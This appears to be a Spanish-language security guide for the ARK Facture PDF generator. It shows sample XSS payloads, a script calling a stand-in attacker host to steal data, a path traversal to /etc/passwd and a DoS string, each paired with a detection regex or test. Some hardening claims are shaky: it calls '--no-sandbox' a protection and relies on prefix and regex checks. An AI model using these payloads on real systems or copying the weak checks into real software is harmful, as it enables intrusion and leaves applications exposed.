# 🔐 Seguridad en Generación de PDF - ARK Facture v4.0

## Validaciones de Seguridad Implementadas

### 1. Validación de HTML

Antes de procesar cualquier HTML, se valida:

```javascript
✅ Tipo de dato: Debe ser string válido
✅ Tamaño máximo: 10MB (previene DoS)
✅ Scripts maliciosos: Detecta <script> tags
✅ Event handlers: Detecta on* attributes
✅ Protocolos peligrosos: javascript:, vbscript:, data:
```

### 2. Validación de Rutas (Archivo)

Cuando se guarda PDF en archivo:

```javascript
✅ Ruta válida: Debe ser string no vacío
✅ Ruta absoluta: Se resuelve a ruta absoluta
✅ Sandbox: No permite escribir fuera de cwd()
✅ Permisos: Respeta permisos del sistema operativo
```

### 3. Aislamiento de Procesos (Puppeteer)

Cuando se usa Puppeteer:

```javascript
✅ --no-sandbox: Deshabilitado en contenedores
✅ --disable-setuid-sandbox: Seguridad adicional
✅ --disable-dev-shm-usage: Previene problemas de memoria
✅ --disable-gpu: Desactiva GPU (más seguro)
✅ --single-process=false: Procesos separados
```

### 4. Timeouts

Previene procesos colgados:

```javascript
✅ Timeout de carga: 30 segundos
✅ Timeout de PDF: 30 segundos
✅ Timeout de html-pdf: 30 segundos
```

### 5. Fallback Seguro

Si falla la generación de PDF:

```javascript
✅ Intenta Puppeteer
✅ Si falla, intenta html-pdf
✅ Si falla, devuelve HTML en base64
✅ Nunca falla completamente
```

## Patrones de Ataque Prevenidos

### XSS (Cross-Site Scripting)

**Ataque:**
```html
<img src=x onerror="alert('XSS')">
```

**Prevención:**
```javascript
// Detecta on* attributes
/on\w+\s*=/gi
```

### Inyección de Scripts

**Ataque:**
```html
<script>fetch('http://attacker.com/steal')</script>
```

**Prevención:**
```javascript
// Detecta <script> tags
/<script[^>]*>[\s\S]*?<\/script>/gi
```

### Protocolos Maliciosos

**Ataque:**
```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

**Prevención:**
```javascript
// Detecta javascript:, vbscript:, data:
/javascript:/gi
/vbscript:/gi
/data:text\/html/gi
```

### Ataque de Denegación de Servicio (DoS)

**Ataque:**
```javascript
// HTML de 1GB
const html = 'A'.repeat(1024 * 1024 * 1024);
```

**Prevención:**
```javascript
if (html.length > 10 * 1024 * 1024) {
  throw new Error('HTML excede tamaño máximo (10MB)');
}
```

### Path Traversal

**Ataque:**
```javascript
await ArkFacture.generarPdfArchivo(html, '../../etc/passwd');
```

**Prevención:**
```javascript
const rutaAbsoluta = resolve(rutaArchivo);
if (!rutaAbsoluta.startsWith(process.cwd())) {
  throw new Error('Ruta de archivo no permitida por seguridad');
}
```

## Mejores Prácticas de Uso

### ✅ CORRECTO

```javascript
// 1. Validar entrada
const factura = JSON.parse(entrada);
if (!factura.empresa?.nombre) throw new Error('Datos inválidos');

// 2. Generar con WASM
const resultado = await ArkFacture.generarComprobante(factura);

// 3. Generar PDF
const pdf = await ArkFacture.generarPdf(resultado.html);

// 4. Guardar con ruta segura
const ruta = resolve('./pdfs', `${factura.numero_comprobante}.pdf`);
await ArkFacture.generarPdfArchivo(resultado.html, ruta);
```

### ❌ INCORRECTO

```javascript
// 1. No validar entrada
const html = req.body.html; // ¡Peligroso!

// 2. No usar WASM
const html = `<h1>${req.body.empresa}</h1>`; // ¡XSS!

// 3. Guardar sin validar ruta
const ruta = req.body.ruta; // ¡Path traversal!
fs.writeFileSync(ruta, pdf);
```

## Configuración Segura en Producción

### Node.js

```javascript
// Usar variables de entorno
const PDF_MAX_SIZE = process.env.PDF_MAX_SIZE || 10 * 1024 * 1024;
const PDF_TIMEOUT = process.env.PDF_TIMEOUT || 30000;
const PDF_OUTPUT_DIR = process.env.PDF_OUTPUT_DIR || './pdfs';

// Crear directorio seguro
import { mkdirSync } from 'fs';
mkdirSync(PDF_OUTPUT_DIR, { recursive: true, mode: 0o755 });
```

### Docker

```dockerfile
FROM node:18-alpine

# Instalar Puppeteer con dependencias
RUN apk add --no-cache \
  chromium \
  noto-fonts \
  freetype \
  harfbuzz \
  ca-certificates \
  ttf-dejavu

# Usar usuario no-root
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001

USER nodejs

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .

CMD ["node", "server.js"]
```

### Nginx (Reverse Proxy)

```nginx
server {
  listen 80;
  server_name api.example.com;

  # Limitar tamaño de request
  client_max_body_size 10M;

  # Limitar rate
  limit_req_zone $binary_remote_addr zone=pdf:10m rate=10r/s;
  limit_req zone=pdf burst=20 nodelay;

  location /api/pdf {
    limit_req zone=pdf burst=5 nodelay;
    proxy_pass http://localhost:3000;
    proxy_read_timeout 35s;
    proxy_connect_timeout 5s;
  }
}
```

## Monitoreo y Logging

### Logging Seguro

```javascript
import winston from 'winston';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Loguear generación de PDF
logger.info('PDF generado', {
  numero_comprobante: factura.numero_comprobante,
  tamaño_bytes: pdf.tamaño_bytes,
  metodo: pdf.metodo,
  timestamp: new Date().toISOString()
});
```

### Alertas de Seguridad

```javascript
// Detectar intentos de ataque
if (html.includes('<script>') || html.includes('javascript:')) {
  logger.warn('⚠️ Intento de XSS detectado', {
    ip: req.ip,
    timestamp: new Date().toISOString()
  });
  // Bloquear o alertar
}
```

## Auditoría de Seguridad

### Verificación Regular

```bash
# Verificar dependencias vulnerables
npm audit

# Actualizar dependencias
npm update

# Verificar WASM signature
sha256sum pkg/facture_ark_bg.wasm
```

### Pruebas de Seguridad

```javascript
// Test: XSS Prevention
const htmlXss = '<img src=x onerror="alert(\'XSS\')">';
try {
  await ArkFacture.generarPdf(htmlXss);
  console.error('❌ XSS no fue bloqueado');
} catch (e) {
  console.log('✅ XSS bloqueado:', e.message);
}

// Test: DoS Prevention
const htmlGrande = 'A'.repeat(11 * 1024 * 1024);
try {
  await ArkFacture.generarPdf(htmlGrande);
  console.error('❌ DoS no fue bloqueado');
} catch (e) {
  console.log('✅ DoS bloqueado:', e.message);
}

// Test: Path Traversal
try {
  await ArkFacture.generarPdfArchivo(html, '../../etc/passwd');
  console.error('❌ Path traversal no fue bloqueado');
} catch (e) {
  console.log('✅ Path traversal bloqueado:', e.message);
}
```

## Cumplimiento de Estándares

- ✅ **OWASP Top 10**: Protección contra vulnerabilidades comunes
- ✅ **CWE**: Prevención de debilidades conocidas
- ✅ **NIST**: Recomendaciones de criptografía
- ✅ **ISO 27001**: Gestión de seguridad de información

## Reporte de Vulnerabilidades

Si encuentras una vulnerabilidad de seguridad:

1. **NO** la publiques públicamente
2. Envía email a: security@ark.com.bo
3. Incluye: descripción, pasos para reproducir, impacto
4. Espera confirmación en 48 horas

---

**ARK Facture v4.0** - Seguridad Enterprise-Grade 🔐

